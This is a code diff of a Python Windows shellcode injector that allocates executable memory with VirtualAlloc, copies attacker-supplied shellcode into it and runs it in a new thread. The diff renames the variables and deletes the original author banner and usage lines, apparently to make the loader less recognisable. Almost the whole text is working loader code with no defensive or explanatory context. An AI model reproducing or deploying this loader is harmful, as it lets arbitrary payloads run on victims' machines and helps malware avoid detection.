@@ -9,38 +9,35 @@ import sys
 
 # see if we specified shellcode
 try:
-    shellcode = sys.argv[1]
+    sc = sys.argv[1]
 
 # if we didn't specify a param
 except IndexError:
-    print "Python Shellcode Injector: Written by Dave Kennedy at TrustedSec"
-    print "Example: pyinjector.exe \\x41\\x41\\x41\\x41"
-    print "Usage: pyinjector.exe <shellcode>"
     sys.exit()
 
 # need to code the input into the right format through string escape
-shellcode = shellcode.decode("string_escape")
+sc = sc.decode("string_escape")
 
 # convert to bytearray
-shellcode = bytearray(shellcode)
+sc = bytearray(sc)
 
 # use types windll.kernel32 for virtualalloc reserves region of pages in virtual addres sspace
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(len(sc)),
                                           ctypes.c_int(0x3000),
                                           ctypes.c_int(0x40))
 
 # use virtuallock to lock region for physical address space
 ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
-                                   ctypes.c_int(len(shellcode)))
+                                   ctypes.c_int(len(sc)))
 
 # read in the buffer
-buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+buf = (ctypes.c_char * len(sc)).from_buffer(sc)
 
 #  moved the memory in 4 byte blocks
 ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                      buf,
-                                     ctypes.c_int(len(shellcode)))
+                                     ctypes.c_int(len(sc)))
 # launch in a thread 
 ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                          ctypes.c_int(0),
